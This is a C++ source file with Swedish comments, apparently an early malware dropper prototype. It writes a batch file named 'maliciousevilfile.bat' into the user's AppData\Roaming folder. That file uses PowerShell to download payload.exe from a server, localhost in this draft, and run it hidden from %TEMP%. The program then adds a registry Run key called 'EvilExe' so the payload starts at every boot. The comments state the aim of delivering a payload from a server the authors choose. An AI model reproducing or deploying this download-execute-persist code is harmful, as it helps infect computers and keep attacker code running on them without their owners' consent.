#include <iostream>
#include <string>
#include <fstream>

using namespace std;

int main() {

    try {

        char* userProfile = getenv("USERPROFILE");
        if (!userProfile) {
            cerr << "USERPROFILE kan inte hittas\n";
            return 1;
        }
        
        string landingPath = string(userProfile) + "\\AppData\\Roaming";

        ofstream landingFile(landingPath + "\\maliciousevilfile.bat");
        if (!landingFile.is_open()) {
            cerr << "Kunde inte skapa filen\n";
            return 1;
        }

        landingFile << "@echo off\n";
        landingFile << "powershell -Command ^"
                    << "Invoke-WebRequest -Uri 'http://localhost:8080/payload.exe' -OutFile '%TEMP%\\payload.exe'; "
                    << "Start-Process '%TEMP%\\payload.exe' -WindowStyle Hidden"
                    << "^";
        //^ detta är hur vi skulle kunna skapa en .bat för att delivera en payload från en server som vi väljer.
        //måste börja koda vår payload också!!
        landingFile.close();

        printf("Skapade filen: %s\\AppData\\Roaming\\maliciousevilfile.bat\n", userProfile);

    }
    catch (const exception& e) {
    cerr << "Error: " << e.what() << endl;
    return 1;
    }

    //exempel på hur vi kan implementera att den dåliga filen startas varje gång datorn startar, genom att lägga till en registernyckel
    try {
        char* userProfile = getenv("USERPROFILE");
        if (!userProfile) {
            cerr << "USERPROFILE kan inte hittas\n";
            return 1;
        }

        string regCommand = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v EvilExe /t REG_SZ /d \"%TEMP%\\payload.exe\" /f";
        system(regCommand.c_str());

        printf("Lade till registernyckel för att starta filen vid uppstart\n");
        //osäker om detta sätt att lägga till regkey funkar

    }
    catch (const exception& e) {
        cerr << "Error: " << e.what() << endl;
        return 1;
    }

    //kan funka nåt sånt här men inte helt säker ^^
    
    //är kluven på hur vi ska göra så att filen den offloadar på /AppData/Roaming är en malicious fil som vi kan göra nåt med
    //inte säker om fstream är det rätta verktyget för det här
}